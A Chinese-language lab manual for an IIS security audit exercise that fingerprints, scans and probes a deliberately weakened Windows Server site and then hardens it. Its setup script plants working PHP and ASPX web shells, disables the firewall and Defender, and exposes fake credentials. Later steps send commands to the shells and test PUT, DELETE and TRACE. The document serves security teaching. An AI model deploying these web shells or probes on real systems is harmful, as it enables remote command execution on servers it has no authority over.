# 实验四：IIS Web服务安全审计与渗透

> 对应章节：项目四 Windows服务器网站管理
实验目标：掌握 IIS Web 服务的安全审计与加固方法（指纹识别、目录扫描、HTTP 方法探测、日志分析、WebShell 风险验证、Request Filtering/安全响应头/目录浏览等加固）
预计用时：120分钟
难度等级：⭐⭐⭐（中级）
> 

---

# 第一部分：前置知识点

## 1. IIS架构深度理解

### 1.1 请求处理管道

当浏览器访问IIS网站时，请求经过以下处理管道：

```
浏览器: http://www.target.local/index.html
    │
    ▼
[1] HTTP.sys（内核态驱动）
    │   • 监听TCP 80/443端口
    │   • 请求队列管理
    │   • 基于URL路由到正确的应用程序池
    │   • 性能极高（内核态运行，无用户态切换）
    │
    ▼
[2] WAS（Windows Process Activation Service）
    │   • 管理应用程序池的生命周期
    │   • 按需启动/回收工作进程
    │   • 从HTTP.sys接收请求，分发给w3wp.exe
    │
    ▼
[3] 应用程序池（Application Pool）→ w3wp.exe
    │   • 进程隔离的核心机制
    │   • 每个池运行独立的w3wp.exe工作进程
    │   • 一个池崩溃不影响其他池的网站
    │   • 可配置.NET CLR版本、托管管道模式
    │
    ▼
[4] IIS功能模块
    │   • 默认文档模块 → 定位index.html
    │   • 静态文件处理 → 直接返回文件
    │   • 身份验证模块 → 确认用户身份
    │   • 授权模块 → 检查权限
    │   • 请求筛选 → 方法/扩展名/URL过滤
    │   • 日志模块 → 记录请求
    │
    ▼
[5] 响应返回
        HTTP/1.1 200 OK
        Content-Type: text/html
        <html>...</html>
```

### 1.2 应用程序池标识与安全隔离

```
应用程序池标识（Identity）决定了工作进程的权限：

┌─────────────────────────┬──────────┬───────────┬──────────────┐
│ 标识类型                 │ 权限级别 │ 推荐场景   │ 安全评级     │
├─────────────────────────┼──────────┼───────────┼──────────────┤
│ ApplicationPoolIdentity │ 最低     │ ✅ 所有生产│ ⭐⭐⭐⭐⭐   │
│ （虚拟账户）              │ 最小权限 │           │              │
│                         │          │           │              │
│ NetworkService          │ 中等     │ 需跨网络   │ ⭐⭐⭐       │
│                         │          │ 访问资源   │              │
│                         │          │           │              │
│ LocalSystem             │ 最高     │ ❌ 严禁使用│ ⭐            │
│                         │ =管理员  │           │              │
└─────────────────────────┴──────────┴───────────┴──────────────┘

ApplicationPoolIdentity 格式：
IIS AppPool\<池名>    例如：IIS AppPool\TargetAppPool

安全意义：
- 每个网站使用独立池 → 一个站点被攻破不影响其他站点
- 使用ApplicationPoolIdentity → 即使站点被攻破，攻击者只能访问该站点的文件
- ❌ 使用LocalSystem → 站点被攻破 = 整台服务器沦陷
```

---

## 2. HTTP协议与状态码

### 2.1 HTTP请求方法与安全含义

```
标准方法：
GET      → 获取资源               安全：✓ 正常浏览
HEAD     → 只获取响应头           安全：✓ 检查资源是否存在
POST     → 提交数据               安全：⚠️ 可能触发SQL注入、XSS
OPTIONS  → 查询支持的方法          安全：⚠️ 泄露服务器能力
PUT      → 上传/创建资源           安全：❌ 可能上传WebShell
DELETE   → 删除资源               安全：❌ 可能删除文件
TRACE    → 回显请求内容            安全：❌ 可能泄露Cookie（XST攻击）

IIS安全配置建议：
允许：GET, HEAD, POST
拒绝：TRACE, OPTIONS, PUT, DELETE, PATCH
```

### 2.2 HTTP状态码安全含义

```
2xx 成功：
  200 OK           → 正常访问（基线）
  201 Created     → 资源创建成功（文件上传成功？）

3xx 重定向：
  301/302         → URL跳转（HTTP→HTTPS重定向）

4xx 客户端错误（安全关注的重点）：
  400 Bad Request  → 恶意请求格式
  401 Unauthorized → ❌ 认证失败（暴力破解！）
  403 Forbidden   → 访问被拒绝（IP限制/权限不足）
  404 Not Found    → ❌ 大量出现 = 目录扫描！
  405 Method Not Allowed → 被拒绝的HTTP方法

5xx 服务器错误：
  500 Internal    → 应用异常（可能被攻击触发）
  503 Unavailable → 服务过载（DDoS？）
```

---

## 3. IIS安全配置要点

### 3.1 纵深防御模型

```
请求进入IIS后的安全防线：

[第一层] 日志审计（看得见）
  │  W3C日志记录每个请求的完整信息
  │  分析目标：异常IP、404洪水、可疑User-Agent
  ▼
[第二层] 请求筛选（拦得住）
  │  HTTP方法限制 + 文件扩展名限制 + URL长度限制
  │  拦截：TRACE/PUT/DELETE + .config/.bak/.log + 超长URL
  ▼
[第三层] 安全响应头（不泄露）
  │  移除X-Powered-By、添加X-Frame-Options等安全头
  │  防御：点击劫持、MIME嗅探、XSS
  ▼
[第四层] 错误页配置（不暴露）
  │  自定义404/500错误页
  │  隐藏：IIS版本号、详细堆栈、文件路径
  ▼
[第五层] Web.config（统一管）
     所有配置收敛到一个文件
     便于版本管理、批量部署
```

### 3.2 敏感信息泄露风险

```
默认IIS配置中常见的信息泄露：

HTTP响应头泄露：
  Server: Microsoft-IIS/10.0          → 泄露服务器软件版本
  X-Powered-By: ASP.NET              → 泄露技术栈
  X-AspNet-Version: 4.0.30319       → 泄露.NET版本

默认错误页泄露：
  404页面 → 显示"IIS 10.0 Detailed Error"
  500页面 → 显示调用堆栈和源代码路径

目录浏览泄露：
  /uploads/ → 直接显示目录下所有文件列表
  /backup/  → 显示备份文件列表

文件类型泄露：
  web.config     → 数据库连接字符串、密钥
  .bak / .old    → 配置备份文件
  .log           → 运行日志
  .sql           → 数据库备份
```

> **实验关键提示**：本实验是一个完整的 IIS 安全审计流程——从信息泄露发现到纵深防御加固。核心思路：先用 Nmap/WhatWeb/Nikto 获取基线与问题清单，再做目录扫描与方法探测验证风险，最后用 IIS 配置与 Web.config 进行统一加固，并对比验证加固效果。
> 

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐              NAT模式               ┌─────────────────────┐
│    Kali Linux       │           192.168.1.0/24             │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────►  │    2025（靶机）      │
│  IP: 192.168.1.10   │                                      │  IP: 192.168.1.20   │
└─────────────────────┘                                      └─────────────────────┘
```

### 1.2 靶机环境详细配置

**虚拟机设置**：

| 项目 | 配置 | 操作系统 | Windows Server 2025 Standard（桌面体验版） |
| --- | --- | --- | --- |
| 内存 | 4 GB | 硬盘 | 60 GB |
| 网络适配器 | NAT模式 | 快照 | 实验前创建快照（命名：实验四-初始状态） |

**靶机IIS环境初始化脚本**（管理员PowerShell执行）：

```powershell
# ============================================
# 靶机环境初始化脚本 - 实验四
# ============================================

# 1. 安装IIS及相关功能
Install-WindowsFeature Web-Server, Web-Common-Http, Web-Asp-Net45, `
  Web-CGI, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Mgmt-Tools, `
  Web-Scripting-Tools -IncludeManagementTools

# 2. 创建网站目录结构
mkdir C:\inetpub\wwwroot\TargetSite
mkdir C:\inetpub\wwwroot\TargetSite\admin
mkdir C:\inetpub\wwwroot\TargetSite\backup
mkdir C:\inetpub\wwwroot\TargetSite\uploads

# 3. 部署测试文件
Set-Content -Path “C:\inetpub\wwwroot\TargetSite\index.html” -Value “<html><head><title>Target Corp</title></head><body><h1>Welcome to Target Corp</h1></body></html>”
Set-Content -Path “C:\inetpub\wwwroot\TargetSite\admin\login.html” -Value “<html><body><h1>Admin Login</h1><form><input name='user'><input name='pass' type='password'><button>Login</button></form></body></html>”
Set-Content -Path “C:\inetpub\wwwroot\TargetSite\config.bak” -Value “DB_SERVER=192.168.1.50;DB_USER=sa;DB_PASS=SqlP@ss2024;DB_NAME=CorpDB”
Set-Content -Path “C:\inetpub\wwwroot\TargetSite\backup\db_backup.sql” -Value “-- Database Backup`nCREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(100));`nINSERT INTO users VALUES (1, 'admin', 'admin123');”
Set-Content -Path “C:\inetpub\wwwroot\TargetSite\uploads\readme.txt” -Value “Upload directory”

# 4. 部署模拟WebShell（用于检测实验）
Set-Content -Path "C:\inetpub\wwwroot\TargetSite\uploads\shell.php" -Value "<?php @eval(`$_POST['cmd']);?>"
Set-Content -Path "C:\inetpub\wwwroot\TargetSite\uploads\test.aspx" -Value "<%@ Page Language=""Jscript""%><%var cmd=Request.Item[""cmd""];if(cmd!=null){var wsh=new ActiveXObject(""WScript.Shell"");var oExec=wsh.Exec(""cmd /c ""+cmd);Response.Write(oExec.StdOut.ReadAll());}%>"

# 5. 创建应用程序池和网站
Import-Module WebAdministration
New-WebAppPool -Name "TargetAppPool"
Set-ItemProperty "IIS:\AppPools\TargetAppPool" -Name processModel.identityType -Value 4

# 停止默认网站，避免端口冲突
Stop-Website -Name "Default Web Site"

New-Website -Name "TargetSite" -Port 80 -PhysicalPath "C:\inetpub\wwwroot\TargetSite" -ApplicationPool "TargetAppPool"

# 6. 启用目录浏览（故意制造漏洞）
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" `
  -PSPath "IIS:\Sites\TargetSite" -Name "enabled" -Value $true

# 7. 关闭防火墙（仅实验环境）
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# 8. 关闭 Windows Defender 实时防护
Set-MpPreference -DisableRealtimeMonitoring $true

Write-Host "IIS实验环境初始化完成！" -ForegroundColor Green
Write-Host "访问 http://192.168.1.20 验证网站是否正常" -ForegroundColor Yellow
```

**攻击机配置**：

```bash
# 配置Kali的hosts文件
echo “192.168.1.20 www.target.local” | sudo tee -a /etc/hosts
```

---

## 二、实验步骤

### 阶段一：Web服务指纹识别

**步骤1：识别Web服务器类型和版本**

```
# 使用Nmap进行Web服务识别
nmap -sV -p 80 192.168.1.20

# 使用whatweb识别技术栈
whatweb http://192.168.1.20
whatweb http://www.target.local

# 使用curl查看HTTP响应头
curl -I http://192.168.1.20

# 预期输出（示例）：
# HTTP/1.1 200 OK
# Content-Type: text/html
# Server: Microsoft-IIS/10.0           ← 暴露IIS版本
# X-Powered-By: ASP.NET               ← 暴露技术栈
# X-AspNet-Version: 4.0.30319         ← 暴露.NET版本
```

> **知识关联**：对应讲义中”安全响应头”——默认IIS配置暴露Server、X-Powered-By等响应头，泄露了技术栈信息。
> 

**步骤2：使用Nikto进行全面扫描**

```
# 使用Nikto扫描Web漏洞
nikto -h http://192.168.1.20

# 预期发现（示例）：
# + Server: Microsoft-IIS/10.0         ← 版本泄露
# + X-Powered-By: ASP.NET              ← 技术栈泄露
# + /admin/                            ← 目录发现
# + /backup/                           ← 目录发现
# + /uploads/                          ← 目录发现
# + Directory indexing found           ← 目录浏览开启
# + /config.bak                        ← 敏感文件泄露
```

> **知识关联**：对应讲义中”禁用目录浏览”和”请求筛选”——目录浏览和敏感文件暴露都是常见的安全配置缺陷。
> 

---

### 阶段二：目录扫描与敏感文件发现

**步骤3：使用Dirsearch进行目录扫描**

```
# 使用dirsearch扫描常见目录和文件
dirsearch -u http://192.168.1.20 -e asp,aspx,php,html,bak,config,sql,txt -t 20

# 预期发现（示例）：
# [200] /index.html
# [200] /admin/
# [200] /backup/
# [200] /uploads/
# [403] /web.config
# [200] /config.bak
# [200] /backup/db_backup.sql
```

**步骤4：使用Gobuster进行更精确的扫描**

```
# 使用Gobuster扫描目录
gobuster dir -u http://192.168.1.20 -w /usr/share/wordlists/dirb/common.txt -t 20 -x .asp,.aspx,.php,.bak,.config,.txt,.sql,.log

# 扫描特定目录下的文件
gobuster dir -u http://192.168.1.20/admin  -w /usr/share/wordlists/dirb/common.txt -t 20
gobuster dir -u http://192.168.1.20/backup -w /usr/share/wordlists/dirb/common.txt -t 20
```

**步骤5：访问敏感文件**

```
# 访问config.bak获取数据库连接信息
curl -s http://192.168.1.20/config.bak
# 预期输出（示例）：DB_SERVER=...;DB_USER=...;DB_PASS=...;DB_NAME=...

# 访问数据库备份
curl -s http://192.168.1.20/backup/db_backup.sql | head

# 测试目录浏览
curl -i http://192.168.1.20/uploads/
# 预期：若开启目录浏览，返回可浏览的文件列表
```

> **安全分析**：目录浏览开启 + 敏感文件存在 = 严重信息泄露。攻击者可以获取数据库凭据、发现已上传的WebShell。
> 

---

### 阶段三：HTTP方法探测

**步骤6：测试允许的HTTP方法**

```
# 使用Nmap检测允许的HTTP方法
nmap -p 80 --script http-methods 192.168.1.20

# 使用curl测试OPTIONS方法
curl -X OPTIONS http://192.168.1.20 -v

# 使用DAVtest测试WebDAV方法（如安装了davtest）
davtest -url http://192.168.1.20

# 测试PUT方法（上传文件）
curl -X PUT http://192.168.1.20/uploads/test_put.txt -d "PUT method test" -v

# 测试DELETE方法（删除文件）
curl -X DELETE http://192.168.1.20/uploads/test_put.txt -v

# 测试TRACE方法
curl -X TRACE http://192.168.1.20 -v
```

> **知识关联**：对应讲义中”请求筛选 - HTTP方法限制”——IIS默认允许TRACE/PUT/DELETE等不必要的方法。
> 

---

### 阶段四：IIS日志分析

**步骤7：分析IIS访问日志**

从靶机复制日志文件到Kali：

```bash
# 在靶机上查看日志文件位置
# C:\inetpub\logs\LogFiles\W3SVC2\

# 复制日志到攻击机进行分析
smbclient //192.168.1.20/C$ -U administrator -c “get inetpub\logs\LogFiles\W3SVC2\u_ex250519.log /tmp/u_ex250519.log”
```

```bash
# 分析日志中的攻击痕迹
# 查看所有404请求（目录扫描痕迹）
grep " 404 " /tmp/u_ex*.log | awk '{print $4, $5, $6, $7, $8, $9, $11}' | sort | uniq -c | sort -rn | head -20

# 查看所有200请求（成功访问的敏感文件）
grep " 200 " /tmp/u_ex*.log | grep -i "config\|backup\|admin\|upload\|shell"

# 查看请求方法分布
awk '{print $6}' /tmp/u_ex*.log | sort | uniq -c | sort -rn

# 查看User-Agent分布（识别扫描工具）
awk -F'"' '{print $6}' /tmp/u_ex*.log | sort | uniq -c | sort -rn | head -10

# 统计状态码分布
awk '{print $10}' /tmp/u_ex*.log | sort | uniq -c | sort -rn
```

> **知识关联**：对应讲义中”IIS日志查看”和”日志审计”——日志是安全审计的核心数据源，分析日志可发现攻击痕迹。
> 

---

### 阶段五：WebShell检测与验证

**步骤8：使用工具检测WebShell**

```
# 尝试访问已发现的WebShell（示例URL）
curl -s "http://192.168.1.20/uploads/shell.php" -d "cmd=whoami"
curl -s "http://192.168.1.20/uploads/test.aspx" -d "cmd=whoami"

# 使用D盾（Windows工具）扫描靶机上的WebShell
# 在靶机上运行 D_WebShellKill.exe，扫描 C:\inetpub\wwwroot\

# 从Linux使用clamav扫描
clamscan -r /tmp/downloaded_site/ --detect-pua=yes
```

---

### 阶段六：IIS安全加固与验证

**步骤9：配置IIS安全加固**

在靶机上执行：

```powershell
Import-Module WebAdministration

# 1. 禁用目录浏览
Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" `
    -PSPath "IIS:\Sites\TargetSite" -Name "enabled" -Value $false

# 2. 移除X-Powered-By响应头
Remove-WebConfigurationProperty -Filter "/system.webServer/httpProtocol/customHeaders" `
    -PSPath "IIS:\Sites\TargetSite" -Name "X-Powered-By"

# 3. 添加安全响应头
Add-WebConfigurationProperty -Filter "/system.webServer/httpProtocol/customHeaders" `
    -PSPath "IIS:\Sites\TargetSite" -Name "." -Value @{name="X-Frame-Options";value="SAMEORIGIN"}
Add-WebConfigurationProperty -Filter "/system.webServer/httpProtocol/customHeaders" `
    -PSPath "IIS:\Sites\TargetSite" -Name "." -Value @{name="X-Content-Type-Options";value="nosniff"}
Add-WebConfigurationProperty -Filter "/system.webServer/httpProtocol/customHeaders" `
    -PSPath "IIS:\Sites\TargetSite" -Name "." -Value @{name="X-XSS-Protection";value="1; mode=block"}

# 4. 配置请求筛选 - 限制HTTP方法
$sitePath = "IIS:\Sites\TargetSite"
# 拒绝TRACE方法
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/verbs" `
    -PSPath $sitePath -Name "." -Value @{verb="TRACE";allowed="false"}
# 拒绝OPTIONS方法
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/verbs" `
    -PSPath $sitePath -Name "." -Value @{verb="OPTIONS";allowed="false"}
# 拒绝PUT方法
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/verbs" `
    -PSPath $sitePath -Name "." -Value @{verb="PUT";allowed="false"}
# 拒绝DELETE方法
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/verbs" `
    -PSPath $sitePath -Name "." -Value @{verb="DELETE";allowed="false"}

# 5. 配置请求筛选 - 限制文件扩展名
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".config";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".bak";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".log";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".sql";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".ps1";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".bat";allowed="false"}
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath $sitePath -Name "." -Value @{fileExtension=".cmd";allowed="false"}

# 6. 限制URL长度
Set-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/requestLimits" `
    -PSPath $sitePath -Name "maxUrl" -Value 4096
Set-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/requestLimits" `
    -PSPath $sitePath -Name "maxQueryString" -Value 2048

# 7. 删除敏感文件
Remove-Item "C:\inetpub\wwwroot\TargetSite\config.bak" -Force
Remove-Item "C:\inetpub\wwwroot\TargetSite\uploads\shell.php" -Force
Remove-Item "C:\inetpub\wwwroot\TargetSite\uploads\test.aspx" -Force
Remove-Item "C:\inetpub\wwwroot\TargetSite\backup\db_backup.sql" -Force
```

**步骤10：创建Web.config统一安全配置文件**

在靶机的网站根目录创建 `C:\inetpub\wwwroot\TargetSite\Web.config`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <remove name="X-AspNet-Version" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-XSS-Protection" value="1; mode=block" />
        <add name="Content-Security-Policy" value="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <verbs allowUnlisted="true">
          <add verb="TRACE" allowed="false" />
          <add verb="OPTIONS" allowed="false" />
          <add verb="PUT" allowed="false" />
          <add verb="DELETE" allowed="false" />
        </verbs>
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".bak" allowed="false" />
          <add fileExtension=".log" allowed="false" />
          <add fileExtension=".sql" allowed="false" />
          <add fileExtension=".ps1" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".inc" allowed="false" />
        </fileExtensions>
        <requestLimits maxUrl="4096" maxQueryString="2048" />
        <denyDoubleEncoding enabled="true" />
      </requestFiltering>
    </security>
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="Replace">
      <remove statusCode="404" />
      <remove statusCode="500" />
      <error statusCode="404" path="/errors/404.html" responseMode="ExecuteURL" />
    </httpErrors>
    <directoryBrowse enabled="false" />
  </system.webServer>
</configuration>
```

**步骤11：验证加固效果**

```bash
# 1. 检查响应头
curl -I http://192.168.1.20
# 预期：无 X-Powered-By、无 X-AspNet-Version，有 X-Frame-Options 等安全头

# 2. 目录浏览应返回403
curl -I http://192.168.1.20/uploads/
# 预期：403 Forbidden

# 3. 敏感文件应返回404
curl -I http://192.168.1.20/config.bak
# 预期：404 Not Found

# 4. 危险HTTP方法应被拒绝
curl -X TRACE http://192.168.1.20 -v
curl -X PUT http://192.168.1.20/uploads/test.txt -d “test” -v
# 预期：405 Method Not Allowed 或 404

# 5. 过长URL应被拒绝
curl “http://192.168.1.20/$(python3 -c ‘print(“A”*5000)’)” -v
# 预期：404 Not Found（URL长度限制生效）

# 6. 重新运行Nikto对比
nikto -h http://192.168.1.20
# 预期：发现项大幅减少
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | Web指纹识别结果 | 服务器版本、技术栈、暴露的响应头 |
| 2 | 目录扫描结果 | 发现的目录和敏感文件列表 |
| 3 | HTTP方法测试结果 | 允许/拒绝的方法列表 |
| 4 | 日志分析报告 | 从日志中发现的攻击痕迹 |
| 5 | 加固前后Nikto扫描对比 | 加固前后漏洞数量对比 |

### 思考题

1. IIS默认配置中存在哪些安全风险？请至少列出5个。
2. 为什么禁用目录浏览是重要的安全措施？
3. 请求筛选限制文件扩展名时，为什么要包含`.bak`和`.log`？
4. Web.config文件的安全配置应该放在网站根目录的哪个位置？优先级如何？
5. 日志分析中如何区分正常的404请求和目录扫描攻击？

---

## 四、实验清理

```powershell
# 1. 删除网站
Stop-Website -Name "TargetSite"
Remove-Website -Name "TargetSite"
Remove-WebAppPool -Name "TargetAppPool"

# 2. 删除网站目录
Remove-Item "C:\inetpub\wwwroot\TargetSite" -Recurse -Force

# 3. 恢复默认网站
Start-Website -Name "Default Web Site"

# 4. 启用防火墙
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 5. 清理hosts文件
Set-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value ""
```

> **免责声明**：本实验仅用于授权的安全教学环境。对Web服务器进行目录扫描和漏洞利用属于违法行为。
>